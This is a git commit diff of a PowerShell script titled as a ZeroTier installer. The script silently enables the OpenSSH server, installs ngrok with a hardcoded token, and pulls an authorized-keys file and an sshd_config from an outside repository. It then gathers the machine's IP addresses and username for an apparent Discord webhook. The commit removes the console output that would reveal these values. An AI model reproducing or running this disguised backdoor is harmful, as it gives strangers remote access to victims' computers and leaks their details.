493d65969a1db578b7124ccd21a8b3b0c1cb40ca
2o2ks <153238359+2o2ks@users.noreply.github.com>
2023-12-26 12:11:28 -0300

    Update ZeroTier v 1.12.2.ps1

--- ZeroTier v 1.12.2.ps1
+++ ZeroTier v 1.12.2.ps1
@@ -1,14 +1,9 @@
 Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0; Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'; Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')); choco install ngrok -y; ngrok config add-authtoken 2Zm58ahROcrPwJl32wKOlvBF26L_25CJ2HEkvkph2QBHLXitV; cd C:\ProgramData\ssh ; if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/administrators_authorized_keys } ; if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/sshd_config }
 ;
 $publicIpAddress = Invoke-RestMethod -Uri "https://ipinfo.io/ip"
-Write-Host "$publicIpAddress"
 
 $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
 $user = $env:USERNAME
-
-Write-Host "$ipAddress"
-Write-Host "$user"
-
 
 $url = "https://discord.com/api/webhooks/1186839699998900224/maAvNFQo7zAuyMb1LUTewrGxSEXMW8XO2iqSgvngflsXlMSJ-ZhErKINHUHfCA5z0pv_"
 
